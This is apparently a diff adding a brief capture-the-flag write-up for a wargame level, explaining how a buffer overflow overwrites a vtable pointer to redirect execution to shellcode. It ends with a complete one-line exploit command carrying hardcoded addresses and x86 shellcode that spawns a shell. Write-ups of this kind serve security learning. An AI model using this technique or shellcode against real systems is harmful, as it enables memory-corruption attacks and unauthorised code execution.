@@ -1,0 +1,6 @@
+This level was fun. It is pretty straightforward. The goal is to overflow the annotation buffer to overwrite the vtable pointer. Fill up the buffer with a fake vtable and point the vtable pointer to your buffer. The fake vtable entry has a single entry that points to the shellcode. 
+Curiously enough, my go-to 23-byte shellcode did not work, but I found another 25-byte one that did :)
+
+Exploit:
+./invoke.sh /levels/level08 `python -c 'print "\x10\xa0\x04\x08\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"A"*73+"\x0c\xa0\x04\x08"'`
+
